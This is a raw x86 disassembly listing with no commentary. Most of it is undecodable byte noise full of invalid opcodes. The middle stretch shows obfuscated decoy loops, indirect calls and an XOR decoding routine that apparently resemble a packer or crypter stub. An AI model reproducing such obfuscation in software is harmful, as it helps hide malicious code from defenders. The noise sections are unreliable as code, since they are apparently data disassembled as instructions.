  41193a:	jbe    0x41195c
  41193c:	sub    al,0xb5
  41193e:	cmp    bl,BYTE PTR [ebp-0x4a4c16a0]
  411944:	fsubr  DWORD PTR [edx+0x7388288d]
  41194a:	jmp    0x3ba6c14b
  41194f:	and    ebx,esi
  411951:	stc    
  411952:	shl    ah,cl
  411954:	arpl   WORD PTR [ecx],dx
  411956:	lods   al,BYTE PTR ds:[esi]
  411957:	adc    BYTE PTR [eax],0x9e
  41195a:	call   0x9dcfebb6
  41195f:	xchg   edi,eax
  411960:	cld    
  411961:	pop    eax
  411962:	int    0x11
  411964:	es jmp 0xfab0071f
  41196a:	jp     0x411950
  41196c:	ds lock inc ebx
  41196f:	dec    ecx
  411970:	pop    ss
  411971:	sbb    DWORD PTR [ecx],esi
  411973:	aad    0xef
  411975:	xor    al,0xe4
  411977:	dec    edx
  411978:	adc    al,0x53
  41197a:	inc    ecx
  41197b:	add    al,0xca
  41197d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41197e:	xchg   edi,eax
  41197f:	or     eax,0x53597f1
  411984:	aam    0x43
  411986:	mov    dl,0x2f
  411988:	push   edx
  411989:	lods   al,BYTE PTR ds:[esi]
  41198a:	push   ds
  41198b:	in     eax,dx
  41198c:	imul   ecx,DWORD PTR [ebx+0x43],0x87b5131e
  411993:	ins    DWORD PTR es:[edi],dx
  411994:	int3   
  411995:	inc    edi
  411996:	push   edi
  411997:	or     eax,0xdd049d02
  41199c:	jno    0x411a04
  41199e:	dec    ebx
  41199f:	out    0x3f,al
  4119a1:	fst    QWORD PTR [ecx+eiz*8-0xa0fbe20]
  4119a8:	add    BYTE PTR [ebp+0x9],al
  4119ab:	jns    0x411958
  4119ad:	dec    eax
  4119ae:	int3   
  4119af:	mov    ah,0x68
  4119b1:	sbb    al,BYTE PTR [edi+ebx*8+0x41]
  4119b5:	jbe    0x411951
  4119b7:	(bad)  [eax+eiz*2]
  4119ba:	jae    0x4119c7
  4119bc:	xchg   esi,eax
  4119bd:	shl    ah,cl
  4119bf:	jae    0x4119e2
  4119c1:	outs   dx,BYTE PTR ds:[esi]
  4119c2:	test   DWORD PTR [ecx],ecx
  4119c4:	into   
  4119c5:	mov    al,ds:0x5a29646a
  4119ca:	pop    edi
  4119cb:	sub    al,0x61
  4119cd:	mov    al,ds:0xd2ac6ce1
  4119d2:	cld    
  4119d3:	push   es
  4119d4:	loopne 0x411997
  4119d6:	fs leave 
  4119d8:	shl    BYTE PTR [edx],1
  4119da:	ret    
  4119db:	shl    DWORD PTR [ebx],1
  4119dd:	das    
  4119de:	xchg   ebp,eax
  4119df:	ja     0x4119c8
  4119e1:	sub    DWORD PTR ds:0xc4a394e2,edx
  4119e7:	arpl   bx,si
  4119e9:	push   cs
  4119ea:	inc    ecx
  4119eb:	rol    BYTE PTR [esi],1
  4119ed:	sti    
  4119ee:	xchg   esi,eax
  4119ef:	fisub  WORD PTR [esi]
  4119f1:	mov    ds,WORD PTR [esp+ecx*2]
  4119f4:	and    al,BYTE PTR [ecx+ebx*2]
  4119f7:	dec    ebp
  4119f8:	or     cl,ah
  4119fa:	pop    esp
  4119fb:	sbb    BYTE PTR [edx],ch
  4119fd:	sbb    al,dh
  4119ff:	dec    ebp
  411a00:	mov    esi,0x8e6a620c
  411a05:	rcl    esi,0x27
  411a08:	dec    eax
  411a09:	xchg   DWORD PTR [eax],eax
  411a0b:	and    eax,edi
  411a0d:	int    0x6c
  411a0f:	frstor [esi+esi*8+0x15]
  411a13:	imul   edx,ecx,0x481d6dd1
  411a19:	sub    DWORD PTR [edx+0x45a893a0],0x1ca3e19f
  411a23:	or     ah,BYTE PTR [ebx]
  411a25:	xchg   DWORD PTR [ecx-0x66],edx
  411a28:	mov    al,0xda
  411a2a:	mov    ecx,0x8a94
  411a2f:	xor    cx,WORD PTR [edi+edx*4+0x2]
  411a34:	and    DWORD PTR ds:0x42867b,0x0
  411a3e:	jmp    0x411a50
  411a43:	mov    edi,DWORD PTR ds:0x42867b
  411a49:	inc    edi
  411a4a:	mov    DWORD PTR ds:0x42867b,edi
  411a50:	cmp    DWORD PTR ds:0x42867b,0x1d
  411a57:	jae    0x411a7f
  411a5d:	cmp    DWORD PTR ds:0x42867b,0x24
  411a64:	ja     0x411a7f
  411a6a:	jmp    0x411a7a
  411a6f:	push   0x42801b
  411a74:	call   DWORD PTR ds:0x4287c3
  411a7a:	jmp    0x411a43
  411a7f:	mov    edi,0x3b56
  411a84:	adc    DWORD PTR ds:0x428657,0x6690
  411a8e:	add    cx,di
  411a91:	sub    DWORD PTR ds:0x42863f,0x428617
  411a9b:	movzx  ecx,cx
  411a9e:	xor    DWORD PTR ds:0x428633,0x428667
  411aa8:	mov    DWORD PTR [ebp-0xc],ecx
  411aab:	or     DWORD PTR ds:0x42862f,edx
  411ab1:	mov    ecx,DWORD PTR [ebp+0x8]
  411ab4:	movzx  ecx,WORD PTR [ecx+edx*4]
  411ab8:	add    DWORD PTR ds:0x4285e7,0xc83
  411ac2:	xor    ecx,0x8a94
  411ac8:	sub    DWORD PTR ds:0x42860f,0x428677
  411ad2:	add    ecx,edi
  411ad4:	mov    edi,DWORD PTR [ebp-0xc]
  411ad7:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  411ade:	inc    edx
  411adf:	mov    ecx,DWORD PTR [ebp-0x10]
  411ae2:	mov    DWORD PTR ds:0x428637,0x76f
  411aec:	cmp    edx,ecx
  411aee:	mov    DWORD PTR ds:0x428647,0x6bd4
  411af8:	jne    0x40f686
  411afe:	and    DWORD PTR ds:0x428647,0x0
  411b08:	mov    ecx,DWORD PTR ds:0x428647
  411b0e:	inc    ecx
  411b0f:	mov    DWORD PTR ds:0x428647,ecx
  411b15:	cmp    DWORD PTR ds:0x428647,0x1b
  411b1c:	jbe    0x411b4e
  411b22:	jmp    0x411b41
  411b27:	push   0x428603
  411b2c:	push   DWORD PTR [ebp-0x14]
  411b2f:	push   DWORD PTR [ebp-0x28]
  411b32:	push   DWORD PTR [ebp-0x10]
  411b35:	push   DWORD PTR [ebp-0x10]
  411b38:	push   DWORD PTR [ebp-0x20]
  411b3b:	call   DWORD PTR ds:0x4287c7
  411b41:	cmp    DWORD PTR ds:0x428647,0x17
  411b48:	jb     0x411b08
  411b4e:	mov    ecx,DWORD PTR [ebp-0x18]
  411b51:	xor    edi,edi
  411b53:	mov    edx,DWORD PTR [ebp+0x10]
  411b56:	adc    DWORD PTR ds:0x42864b,ecx
  411b5c:	xor    ecx,eax
  411b5e:	add    ecx,esi
  411b60:	mov    DWORD PTR [edx],ecx
  411b62:	mov    ecx,DWORD PTR [ebp-0x18]
  411b65:	xor    ecx,eax
  411b67:	add    ecx,esi
  411b69:	adc    DWORD PTR ds:0x4285d7,ebx
  411b6f:	mov    DWORD PTR [ebp-0xc],ecx
  411b72:	mov    DWORD PTR [ebp+0x8],0xf89c85b0
  411b79:	adc    edi,DWORD PTR ds:0x428663
  411b7f:	mov    DWORD PTR [ebp-0x14],0xf89c8580
  411b86:	or     DWORD PTR ds:0x42866b,ebx
  411b8c:	mov    DWORD PTR [ebp-0x10],0xf89c95b0
  411b93:	sub    DWORD PTR ds:0x428673,edx
  411b99:	mov    ecx,DWORD PTR [ebp-0x14]
  411b9c:	and    DWORD PTR ds:0x428637,edi
  411ba2:	mov    DWORD PTR [ebp+0x8],ecx
  411ba5:	mov    ecx,DWORD PTR [ebp+0x8]
  411ba8:	mov    edi,DWORD PTR ds:0x42865f
  411bae:	adc    DWORD PTR ds:0x428613,edi
  411bb4:	xor    ecx,eax
  411bb6:	add    ecx,esi
  411bb8:	mov    ecx,0x242ebcc
  411bbd:	mov    DWORD PTR ds:0x428613,0x3550
  411bc7:	mov    edi,0xf641bc3
  411bcc:	mov    DWORD PTR ds:0x428633,0x2c84
  411bd6:	je     0x41b172
  411bdc:	mov    ebx,DWORD PTR ds:0x4286b7
  411be2:	mov    edx,DWORD PTR ds:0x4286e3
  411be8:	sub    edx,ebx
  411bea:	imul   ebx,DWORD PTR [ebx+edx*1]
  411bee:	mov    edx,DWORD PTR [ebp+0x8]
  411bf1:	movzx  ebx,BYTE PTR ds:0x4285ef
  411bf8:	sub    DWORD PTR ds:0x428657,ebx
  411bfe:	mov    ebx,DWORD PTR [ebp-0x8]
  411c01:	adc    DWORD PTR ds:0x42860f,0x4285eb
  411c0b:	xor    edx,eax
  411c0d:	sub    DWORD PTR ds:0x428643,0x428673
  411c17:	xor    ebx,eax
  411c19:	sub    edx,ebx
  411c1b:	and    DWORD PTR ds:0x42866f,ecx
  411c21:	sub    edx,esi
  411c23:	xor    edx,eax
  411c25:	adc    DWORD PTR ds:0x42865b,ebx
  411c2b:	mov    DWORD PTR [ebp+0x8],edx
  411c2e:	mov    edx,DWORD PTR ds:0x42867f
  411c34:	mov    ebx,DWORD PTR ds:0x4286fb
  411c3a:	sub    ebx,edx
  411c3c:	imul   edx,DWORD PTR [edx+ebx*1]
  411c40:	mov    edx,DWORD PTR [ebp+0x8]
  411c43:	and    DWORD PTR ds:0x428647,0x0
  411c4d:	jmp    0x411c61
  411c52:	xor    ebx,ebx
  411c54:	xor    ebx,DWORD PTR ds:0x428647
  411c5a:	inc    ebx
  411c5b:	mov    DWORD PTR ds:0x428647,ebx
  411c61:	cmp    DWORD PTR ds:0x428647,0x14
  411c68:	jae    0x411cb1
  411c6e:	cmp    DWORD PTR ds:0x428647,0xc
  411c75:	jle    0x411cb1
  411c7b:	jmp    0x411c90
  411c80:	push   0x4285d3
  411c85:	push   0x42800b
  411c8a:	call   DWORD PTR ds:0x4287cb
  411c90:	cmp    DWORD PTR ds:0x428647,0xb
  411c97:	jne    0x411cac
  411c9d:	xor    ebx,ebx
  411c9f:	xor    ebx,DWORD PTR ds:0x428647
  411ca5:	inc    ebx
  411ca6:	mov    DWORD PTR ds:0x428647,ebx
  411cac:	jmp    0x411c52
  411cb1:	mov    ebx,DWORD PTR [ebp-0x58]
  411cb4:	not    DWORD PTR ds:0x4285e3
  411cba:	add    edx,0x5708f1
  411cc0:	sbb    DWORD PTR ds:0x42866f,0xe9d
  411cca:	imul   edx,ebx
  411ccd:	mov    DWORD PTR [ebp-0x58],edx
  411cd0:	mov    edx,DWORD PTR [ebp+0x8]
  411cd3:	movzx  ebx,WORD PTR ds:0x42863f
  411cda:	xor    DWORD PTR ds:0x428677,ebx
  411ce0:	mov    ebx,DWORD PTR [ebp-0x54]
  411ce3:	add    edx,0x64f893
  411ce9:	or     edx,ebx
  411ceb:	dec    ebx
  411cec:	mov    DWORD PTR [ebp-0x54],edx
  411cef:	mov    edx,DWORD PTR [ebp+0x8]
  411cf2:	xor    DWORD PTR ds:0x428613,edi
  411cf8:	mov    ebx,DWORD PTR [ebp-0x50]
  411cfb:	adc    DWORD PTR ds:0x42862b,0x428663
  411d05:	add    edx,ecx
  411d07:	xor    edx,ebx
  411d09:	inc    DWORD PTR ds:0x42864b
  411d0f:	mov    DWORD PTR [ebp-0x50],edx
  411d12:	sbb    DWORD PTR ds:0x42865f,0x428633
  411d1c:	mov    edx,DWORD PTR [ebp+0x8]
  411d1f:	add    DWORD PTR ds:0x42863f,0x2dae
  411d29:	mov    ebx,DWORD PTR [ebp-0x4c]
  411d2c:	add    edx,edi
  411d2e:	inc    DWORD PTR ds:0x428617
  411d34:	and    edx,ebx
  411d36:	and    ebx,0x7d1c
  411d3c:	mov    DWORD PTR [ebp-0x4c],edx
  411d3f:	xor    DWORD PTR ds:0x428613,0x4285ef
  411d49:	mov    edx,DWORD PTR [ebp+0x8]
  411d4c:	mov    ebx,DWORD PTR [ebp-0x48]
  411d4f:	lea    edx,[ebx+edx*1+0x241fcde]
  411d56:	mov    ebx,DWORD PTR ds:0x42863f
  411d5c:	and    DWORD PTR ds:0x428633,ebx
  411d62:	mov    DWORD PTR [ebp-0x48],edx
  411d65:	or     ebx,0x3ec
  411d6b:	mov    edx,DWORD PTR [ebp+0x8]
  411d6e:	mov    ebx,0xfa5e1521
  411d73:	or     DWORD PTR ds:0x428647,0x60bd
  411d7d:	sub    ebx,edx
  411d7f:	add    edx,DWORD PTR ds:0x42866f
  411d85:	add    ebx,DWORD PTR [ebp-0x44]
  411d88:	mov    DWORD PTR [ebp-0x44],ebx
  411d8b:	and    DWORD PTR ds:0x42867b,0x0
  411d95:	jmp    0x411da7
  411d9a:	mov    edx,DWORD PTR ds:0x42867b
  411da0:	inc    edx
  411da1:	mov    DWORD PTR ds:0x42867b,edx
  411da7:	cmp    DWORD PTR ds:0x42867b,0x18
  411dae:	jae    0x411dfe
  411db4:	cmp    DWORD PTR ds:0x42867b,0xa
  411dbb:	jge    0x411dfe
  411dc1:	jmp    0x411ddf
  411dc6:	push   DWORD PTR [ebp-0x14]
  411dc9:	push   DWORD PTR [ebp-0x20]
  411dcc:	push   0x73a3
  411dd1:	push   DWORD PTR [ebp-0xc]
  411dd4:	push   0x249b
  411dd9:	call   DWORD PTR ds:0x42879f
  411ddf:	cmp    DWORD PTR ds:0x42867b,0x9
  411de6:	jne    0x411df9
  411dec:	mov    edx,DWORD PTR ds:0x42867b
  411df2:	inc    edx
  411df3:	mov    DWORD PTR ds:0x42867b,edx
  411df9:	jmp    0x411d9a
  411dfe:	mov    edx,DWORD PTR [ebp+0x8]
  411e01:	adc    DWORD PTR ds:0x4285d3,0x42865b
  411e0b:	xor    edx,eax
  411e0d:	or     DWORD PTR ds:0x428657,0x7d10
  411e17:	add    edx,esi
  411e19:	mov    DWORD PTR ds:0x428613,0x2646
  411e23:	jne    0x411bdc
  411e29:	jmp    0x41b172
  411e2e:	and    ebx,DWORD PTR ds:0x428603
  411e34:	mov    edx,DWORD PTR [ebp-0xc]
  411e37:	sub    edx,esi
  411e39:	add    ebx,0x210e
  411e3f:	xor    edx,eax
  411e41:	mov    DWORD PTR [ebp-0x5c],edx
  411e44:	and    DWORD PTR ds:0x4285ef,0x0
  411e4e:	jmp    0x411e62
  411e53:	xor    ebx,ebx
  411e55:	add    ebx,DWORD PTR ds:0x4285ef
  411e5b:	inc    ebx
  411e5c:	mov    DWORD PTR ds:0x4285ef,ebx
  411e62:	cmp    DWORD PTR ds:0x4285ef,0x17
  411e69:	jae    0x411ea9
  411e6f:	cmp    DWORD PTR ds:0x4285ef,0xe
  411e76:	ja     0x411ea9
  411e7c:	jmp    0x411e8a
  411e81:	push   DWORD PTR [ebp-0xc]
  411e84:	call   DWORD PTR ds:0x4287a3
  411e8a:	cmp    DWORD PTR ds:0x4285ef,0xd
  411e91:	jne    0x411ea4
  411e97:	mov    ebx,DWORD PTR ds:0x4285ef
  411e9d:	inc    ebx
  411e9e:	mov    DWORD PTR ds:0x4285ef,ebx
  411ea4:	jmp    0x411e53
  411ea9:	mov    edx,DWORD PTR [ebp-0x10]
  411eac:	mov    DWORD PTR ds:0x4285db,0x15
  411eb6:	cmp    DWORD PTR ds:0x4285db,0x0
  411ebd:	je     0x411f11
  411ec3:	cmp    DWORD PTR ds:0x4285db,0x6
  411eca:	jl     0x411f11
  411ed0:	jmp    0x411ee5
  411ed5:	push   0x12dd
  411eda:	push   0x428000
  411edf:	call   DWORD PTR ds:0x4287a7
  411ee5:	cmp    DWORD PTR ds:0x4285db,0x7
  411eec:	jne    0x411eff
  411ef2:	mov    ebx,DWORD PTR ds:0x4285db
  411ef8:	dec    ebx
  411ef9:	mov    DWORD PTR ds:0x4285db,ebx
  411eff:	mov    ebx,DWORD PTR ds:0x4285db
  411f05:	dec    ebx
  411f06:	mov    DWORD PTR ds:0x4285db,ebx
  411f0c:	jmp    0x411eb6
  411f11:	mov    ebx,DWORD PTR [ebp-0x8]
  411f14:	xor    edx,eax
  411f16:	xor    DWORD PTR ds:0x42863b,0x3a5d
  411f20:	xor    ebx,eax
  411f22:	sub    edx,ebx
  411f24:	adc    DWORD PTR ds:0x42860f,0x428633
  411f2e:	sub    edx,esi
  411f30:	and    DWORD PTR ds:0x42864f,0x428607
  411f3a:	xor    edx,eax
  411f3c:	mov    DWORD PTR ds:0x428663,0x12b9
  411f46:	mov    DWORD PTR [ebp-0x10],edx
  411f49:	movzx  edx,WORD PTR ds:0x42863f
  411f50:	mov    edx,DWORD PTR [ebp-0x14]
  411f53:	mov    DWORD PTR [ebp+0x8],edx
  411f56:	jmp    0x414473
  411f5b:	adc    DWORD PTR ds:0x42866b,0x365a
  411f65:	mov    edx,DWORD PTR [ebp+0x8]
  411f68:	add    DWORD PTR ds:0x42865b,0x2d5e
  411f72:	mov    ebx,DWORD PTR [ebp-0x8]
  411f75:	xor    edx,eax
  411f77:	xor    ebx,eax
  411f79:	jmp    0x41431a
  411f7e:	push   0xf
  411f80:	xor    al,0x44
  411f82:	pop    ss
  411f83:	inc    edi
  411f84:	or     al,BYTE PTR [edi]
  411f86:	into   
  411f87:	addr16 mov ds:0xb6f4,al
  411f8b:	pushf  
  411f8c:	enter  0xc62c,0x82
  411f90:	jp     0x41200c
  411f92:	(bad)  
  411f93:	pop    edi
  411f94:	jp     0x412010
  411f96:	repz inc eax
  411f98:	mov    bh,0x30
  411f9a:	cmp    DWORD PTR [ebp+0x4d],eax
  411f9d:	sbb    edx,DWORD PTR [edx]
  411f9f:	shr    edx,1
  411fa1:	mov    cl,0xa9
  411fa3:	sub    eax,0xd45d576c
  411fa8:	(bad)  
  411fa9:	xor    al,0x84
  411fab:	in     al,dx
  411fac:	js     0x411ff4
  411fae:	mov    ch,bh
  411fb0:	sbb    edi,DWORD PTR [ecx+0x14]
  411fb3:	cdq    
  411fb4:	mov    esi,0x8285bb4e
  411fb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fba:	mov    WORD PTR [ecx+0x66],fs
  411fbd:	lea    ebp,[ecx-0x33]
  411fc0:	imul   eax,edx,0xe5db51f9
  411fc6:	inc    esp
  411fc7:	xor    al,0x96
  411fc9:	arpl   bp,di
  411fcb:	push   esi
  411fcc:	mov    ch,0xe
  411fce:	inc    ebp
  411fcf:	push   edx
  411fd0:	aad    0x76
  411fd2:	inc    eax
  411fd3:	es test ecx,esp
  411fd6:	rol    BYTE PTR [ebp+0x52],0x4f
  411fda:	stos   BYTE PTR es:[edi],al
  411fdb:	out    0x86,eax
  411fdd:	xchg   BYTE PTR ds:0x5f8a7fd4,dl
  411fe3:	jb     0x41205f
  411fe5:	shl    BYTE PTR ds:[eax],cl
  411fe8:	cdq    
  411fe9:	div    BYTE PTR [esi-0xb]
  411fec:	jbe    0x412054
  411fee:	repnz cwde 
  411ff0:	xchg   edx,eax
  411ff1:	gs mov eax,0x834a1472
  411ff7:	into   
  411ff8:	out    0x87,eax
  411ffa:	and    al,ah
  411ffc:	push   ebp
  411ffd:	push   ecx
  411ffe:	je     0x411f8a
  412000:	cmp    BYTE PTR [edi+eax*8+0x3d],ah
  412004:	mov    dl,0xb2
  412006:	inc    edx
  412007:	mov    ecx,DWORD PTR [edi+edx*8-0x1ad8f479]
  41200e:	fnstenv [eax+0x5f]
  412011:	mov    ecx,0x9a18759
  412016:	pop    edx
  412017:	push   es
  412018:	dec    esi
  412019:	push   edi
  41201a:	adc    edx,DWORD PTR ds:0xb8cb37d5
  412020:	jnp    0x412021
  412022:	mov    edi,0xbfbdf9ee
  412027:	add    bh,BYTE PTR [edi+esi*2-0x52e7b65e]
  41202e:	or     dl,dh
  412030:	inc    esi
  412031:	ins    DWORD PTR es:[edi],dx
  412032:	(bad)  
  412033:	xor    eax,0xa3adf478
  412038:	cli    
  412039:	loope  0x41204f
  41203b:	fbld   TBYTE PTR [esi]
  41203d:	xchg   esi,eax
  41203e:	loopne 0x412000
  412040:	(bad)  
  412041:	mov    eax,0x1599d655
  412046:	stos   BYTE PTR es:[edi],al
  412047:	sub    al,0xc9
  412049:	sub    BYTE PTR [eax],dh
  41204b:	pop    esi
  41204c:	mov    ch,0xf4
  41204e:	int3   
  41204f:	test   DWORD PTR [esi+eax*2],ecx
  412052:	fcomi  st,st(7)
  412054:	add    ebp,esi
  412056:	jmp    0xa164:0x3a7c717a
  41205d:	jg     0x4120cb
  41205f:	jle    0x412077
  412061:	inc    ebp
  412062:	sbb    esi,DWORD PTR [ebx+ebp*4+0x272b64ff]
  412069:	pushf  
  41206a:	and    dl,cl
  41206c:	or     ebx,ebx
  41206e:	daa    
  41206f:	pop    ebp
  412070:	adc    eax,0xf781e888
  412075:	int3   
  412076:	push   ebx
  412077:	int3   
  412078:	fwait
  412079:	popf   
  41207a:	cmc    
  41207b:	ror    DWORD PTR [edx+edi*2-0x700288e3],1
  412082:	jb     0x412064
  412084:	mov    BYTE PTR ds:0xcf85032e,al
  41208a:	xor    al,0x9d
  41208c:	and    bh,dh
  41208e:	jg     0x4120a4
  412090:	stc    
  412091:	sbb    al,0xad
  412093:	fdiv   QWORD PTR [ebx+0x11cf6d42]
  412099:	lahf   
  41209a:	dec    ebx
  41209b:	mov    ch,0x7f
  41209d:	sub    esi,DWORD PTR [ebp-0x33]
  4120a0:	cmp    eax,DWORD PTR [edi+0x10fcc28c]
  4120a6:	daa    
  4120a7:	fmul   QWORD PTR [esi]
  4120a9:	jbe    0x412059
  4120ab:	mov    cl,0x93
  4120ad:	cmp    al,0xe4
  4120af:	sbb    eax,0xabac28b1
  4120b4:	imul   ebx,DWORD PTR [ecx+0xc],0x8e0136d3
  4120bb:	ret    0xb643
  4120be:	dec    eax
  4120bf:	sahf   
  4120c0:	dec    edx
  4120c1:	(bad)  
  4120c2:	fdiv   DWORD PTR [ebx-0x72]
  4120c5:	lods   al,BYTE PTR ds:[esi]
  4120c6:	mov    dh,0x95
  4120c8:	dec    edx
  4120c9:	mov    ecx,0x54022a0a
  4120ce:	mov    al,0x90
  4120d0:	aas    
  4120d1:	and    eax,0x1d3c1bbd
  4120d6:	cmp    BYTE PTR [edx],cl
  4120d8:	inc    ebx
  4120d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120da:	dec    ebx
  4120db:	mov    esi,0xb6cd1c20
  4120e0:	std    
  4120e1:	lock sti 
  4120e3:	adc    eax,0x94e0cf9b
  4120e8:	pop    ecx
  4120e9:	mov    ecx,0x51a4818c
  4120ee:	xchg   edx,eax
  4120ef:	mov    eax,ds:0xb2d284e3
  4120f4:	dec    esp
  4120f5:	hlt    
  4120f6:	lods   eax,DWORD PTR ds:[esi]
  4120f7:	int    0xb4
  4120f9:	pop    eax
  4120fa:	sar    DWORD PTR [eax+0x3f],cl
  4120fd:	(bad)
  412100:	cmp    dh,BYTE PTR [edx+ebx*2-0x2c]
  412104:	mov    al,0x31
  412106:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412107:	sub    ebp,DWORD PTR [ecx+0x6c2df87a]
  41210d:	out    0xd2,eax
  41210f:	mov    dh,0x0
  412111:	sub    edi,esp
  412113:	mov    BYTE PTR [edx],0xde
  412116:	ins    DWORD PTR es:[edi],dx
  412117:	mov    ebp,DWORD PTR [ebp+0x5a]
  41211a:	sbb    esi,DWORD PTR [ebp+esi*4-0x6e19219f]
  412121:	fs loop 0x41218f
  412124:	shl    BYTE PTR [edx],cl
  412126:	add    DWORD PTR [edx],ecx
  412128:	dec    esp
  412129:	test   DWORD PTR [edx+esi*8-0xc],eax
  41212d:	jmp    0xff03:0xa4af20f3
  412134:	adc    BYTE PTR [ecx+0x7e5b3808],ch
  41213a:	xchg   ecx,eax
  41213b:	mov    eax,0x21803dad
  412140:	iret   
  412141:	xor    BYTE PTR [eax+0x2363da8f],bl
  412147:	pushf  
  412148:	adc    BYTE PTR [edi-0x6d],dh
  41214b:	(bad)  
  41214c:	fidivr WORD PTR [edi-0x1cecc228]
  412152:	pop    es
  412153:	xor    al,0xb3
  412155:	icebp  
  412156:	xor    BYTE PTR [esi+0x10b649e9],dh
  41215c:	rcl    BYTE PTR [ebx+edi*2],0x90
  412160:	sub    BYTE PTR [ebx-0x6cbfa419],bh
  412166:	inc    ebp
  412167:	pcmpeqw mm0,QWORD PTR [ecx+0x4c841f73]
  41216e:	pop    ebx
  41216f:	sbb    eax,0xa4028d93
  412174:	adc    al,0x39
  412176:	lea    esi,[ebp+0x6473958a]
  41217c:	stos   DWORD PTR es:[edi],eax
  41217d:	stos   DWORD PTR es:[edi],eax
  41217e:	push   ebx
  41217f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412180:	dec    edx
  412181:	adc    eax,0x905fe203
  412186:	aaa    
  412187:	pop    es
  412188:	dec    esp
  412189:	shl    BYTE PTR [ecx-0x5c],cl
  41218c:	popf   
  41218d:	cmp    edi,esi
  41218f:	pop    ebp
  412190:	push   esp
  412191:	sub    edx,esi
  412193:	ds rol ebx,1
  412196:	mov    al,0xa5
  412198:	adc    ah,BYTE PTR [edi]
  41219a:	inc    eax
  41219b:	mov    al,ds:0xa27663b2
  4121a0:	pop    ebx
  4121a1:	fucom  st(3)
  4121a3:	(bad)  
  4121a4:	xchg   esi,eax
  4121a5:	xor    esi,DWORD PTR [ebx]
  4121a7:	stos   BYTE PTR es:[edi],al
  4121a8:	xchg   esi,esi
  4121aa:	loope  0x41214c
  4121ac:	adc    edi,DWORD PTR [esi*4-0x6516093a]
  4121b3:	and    bh,al
  4121b5:	inc    ebp
  4121b6:	lahf   
  4121b7:	jne    0x41213e
  4121b9:	or     dl,ah
  4121bb:	fisub  WORD PTR [esi+0x8d78d60]
  4121c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121c2:	xor    DWORD PTR cs:[eax],0x53
  4121c6:	xor    eax,0xca8cfcf7
  4121cb:	push   ebx
  4121cc:	jl     0x41224d
  4121ce:	les    ebx,FWORD PTR [ebx-0x49]
  4121d1:	mov    bl,BYTE PTR [ebx-0x3c]
  4121d4:	push   ebp
  4121d5:	bound  ecx,QWORD PTR [eax+ebx*8]
  4121d8:	xlat   BYTE PTR ds:[ebx]
  4121d9:	add    eax,ebx
  4121db:	push   ebp
  4121dc:	push   es
  4121dd:	add    DWORD PTR [edi+0x46718001],esi
  4121e3:	cmp    edi,ebp
  4121e5:	push   esi
  4121e6:	in     al,dx
  4121e7:	out    0x7d,al
  4121e9:	stos   BYTE PTR es:[edi],al
  4121ea:	fadd   st,st(7)
  4121ec:	xchg   edx,eax
  4121ed:	arpl   cx,bx
  4121ef:	test   DWORD PTR [edx],0x38c6bc37
  4121f5:	push   cs
  4121f6:	(bad)  
  4121f7:	out    dx,al
  4121f8:	retf   
  4121f9:	in     eax,dx
  4121fa:	ss js  0x412279
  4121fd:	mov    ebp,0x232d68e7
  412202:	sbb    BYTE PTR [edi+0x7b],al
  412205:	scas   eax,DWORD PTR es:[edi]
  412206:	daa    
  412207:	dec    ecx
  412208:	add    esi,DWORD PTR [esi+0x755bc37a]
  41220e:	enter  0x9c00,0xa0
  412212:	pop    eax
  412213:	and    DWORD PTR [ebp-0x5c],0x89f2e76
  41221a:	cs jmp 0xfb31c88d
  412220:	adc    al,0xc1
  412222:	rcl    DWORD PTR [ecx],1
  412224:	push   eax
  412225:	mov    ch,0xd7
  412227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412228:	jo     0x41225a
  41222a:	aas    
  41222b:	mov    cl,0xd3
  41222d:	push   esi
  41222e:	mov    edi,0x3505a276
  412233:	cli    
  412234:	rcr    DWORD PTR [ebx+0x65],1
  412237:	fst    DWORD PTR [ecx]
  412239:	dec    ecx
  41223a:	retf   0x85da
  41223d:	mov    ebx,0x932a0488
  412242:	push   ds
  412243:	rol    BYTE PTR [ebx+0x64],1
  412246:	mov    dh,0xbe
  412248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412249:	cmp    al,0x40
  41224b:	out    0x5a,eax
  41224d:	mov    ecx,0xe4eae80c
  412252:	imul   ecx,DWORD PTR [esi-0x3a260abd],0x59
  412259:	(bad)  
  41225a:	(bad)  
  41225b:	shl    DWORD PTR [ebx+0x62ca652f],cl
  412261:	add    BYTE PTR [ebx-0x3abc3b13],0x82
  412268:	xchg   BYTE PTR [edx*1+0x4ee5ed9d],bh
  41226f:	pop    ebp
  412270:	adc    al,0x80
  412272:	popf   
  412273:	and    DWORD PTR [ecx],ebp
  412275:	shl    al,0xd5
  412278:	mov    edx,0xe1e1ed59
  41227d:	push   cs
  41227e:	iret   
  41227f:	cld    
  412280:	inc    eax
  412281:	push   esp
  412282:	out    dx,al
  412283:	xchg   edi,eax
  412284:	dec    esp
  412285:	test   al,0x5b
  412287:	and    DWORD PTR [esi],ebx
  412289:	dec    DWORD PTR [edi]
  41228b:	ins    BYTE PTR es:[edi],dx
  41228c:	mov    esp,0x84f613e
  412291:	lea    edx,[ecx+0x3a]
  412294:	fadd   st,st(0)
  412296:	retf   0xb306
  412299:	xor    bl,cl
  41229b:	mov    DWORD PTR [ecx-0x4b],edx
  41229e:	shl    dl,cl
  4122a0:	pusha  
  4122a1:	pop    ecx
  4122a2:	inc    ebx
  4122a3:	in     al,dx
  4122a4:	sub    cl,bh
  4122a6:	(bad)  [edx]
  4122a8:	inc    edi
  4122a9:	fiadd  WORD PTR [edx]
  4122ab:	dec    esp
  4122ac:	sti    
  4122ad:	and    eax,0xb9a75a48
  4122b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122b3:	or     DWORD PTR [eax-0xf],ecx
  4122b6:	lods   al,BYTE PTR ds:[esi]
  4122b7:	fstp   DWORD PTR [eax+0x5a]
  4122ba:	rcl    BYTE PTR [ebx],1
  4122bc:	xor    edx,DWORD PTR [edi]
  4122be:	sbb    dh,dh
  4122c0:	icebp  
  4122c1:	dec    edx
  4122c2:	sbb    al,0xa5
  4122c4:	xchg   DWORD PTR ds:0x2eb8cc27,ebx
  4122ca:	retf   0xad79
  4122cd:	jp     0x412309
  4122cf:	popf   
